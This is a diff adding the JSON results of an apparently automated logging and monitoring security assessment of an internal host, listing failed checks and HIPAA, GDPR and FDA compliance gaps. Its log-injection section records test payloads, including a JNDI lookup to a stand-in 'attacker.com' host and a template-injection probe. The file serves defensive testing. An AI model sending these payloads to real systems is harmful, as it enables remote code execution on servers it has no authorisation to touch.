@@ -1,0 +1,129 @@
+{
+  "target": "192.168.25.105:5000",
+  "timestamp": "2026-09-25T15:45:20Z",
+  "tests": {
+    "log_endpoints": {
+      "endpoints_tested": 12,
+      "endpoints_found": [],
+      "logs_accessible": false,
+      "vulnerable": false
+    },
+    "auth_logging": {
+      "test_performed": true,
+      "auth_attempts_made": 13,
+      "logging_detected": false,
+      "rate_limiting_detected": false,
+      "account_lockout": false,
+      "vulnerable": true
+    },
+    "security_logging": {
+      "attacks_simulated": [
+        {
+          "name": "Directory Traversal",
+          "status_code": 404,
+          "blocked": false
+        },
+        {
+          "name": "SQL Injection",
+          "status_code": 200,
+          "blocked": false
+        },
+        {
+          "name": "XSS Attempt",
+          "status_code": 200,
+          "blocked": false
+        },
+        {
+          "name": "Command Injection",
+          "status_code": 200,
+          "blocked": false
+        }
+      ],
+      "detection_indicators": [],
+      "vulnerable": true
+    },
+    "audit_trail": {
+      "audit_endpoints_found": false,
+      "audit_data_available": false,
+      "timestamp_present": false,
+      "user_tracking": false,
+      "vulnerable": true
+    },
+    "log_injection": {
+      "test_performed": true,
+      "injection_possible": false,
+      "payloads_tested": [
+        {
+          "payload": "%0A[INFO] Log injection test",
+          "location": "User-Agent header",
+          "status": 200
+        },
+        {
+          "payload": "${jndi:ldap://attacker.com/a}",
+          "location": "User-Agent header",
+          "status": 200
+        },
+        {
+          "payload": "{{7*7}}",
+          "location": "User-Agent header",
+          "status": 200
+        }
+      ],
+      "vulnerable": false
+    },
+    "alerting": {
+      "alert_endpoints_found": [],
+      "notification_config": false,
+      "alert_thresholds": false,
+      "vulnerable": true
+    },
+    "access_logging": {
+      "unique_requests_made": 3,
+      "logging_indicators": [],
+      "vulnerable": true
+    }
+  },
+  "vulnerabilities_found": [
+    {
+      "type": "No Failed Auth Rate Limiting",
+      "severity": "High",
+      "description": "No rate limiting or lockout after 13 failed auth attempts",
+      "impact": "Brute force attacks possible without detection"
+    },
+    {
+      "type": "No Security Event Detection",
+      "severity": "High",
+      "description": "Attack patterns not detected or blocked",
+      "impact": "Attacks may go unnoticed, no incident response triggered"
+    },
+    {
+      "type": "Insufficient Audit Trail",
+      "severity": "Medium",
+      "description": "No proper audit logging of user activities",
+      "impact": "Cannot trace security incidents or user actions"
+    },
+    {
+      "type": "No Security Alerting",
+      "severity": "Medium",
+      "description": "No security alerting mechanisms detected",
+      "impact": "Security incidents may not trigger notifications"
+    },
+    {
+      "type": "No Access Logging",
+      "severity": "Medium",
+      "description": "No indication of access logging",
+      "impact": "Cannot track who accessed the system"
+    }
+  ],
+  "logging_assessment": {
+    "overall_rating": "Poor",
+    "detection_capability": "None",
+    "incident_response_readiness": "Not Ready",
+    "compliance_gaps": [
+      "HIPAA: Audit controls requirement (164.312(b))",
+      "HIPAA: Information system activity review (164.308(a)(1)(ii)(D))",
+      "GDPR: Security monitoring obligations (Article 32)",
+      "FDA: Cybersecurity event logging requirements"
+    ]
+  }
+}
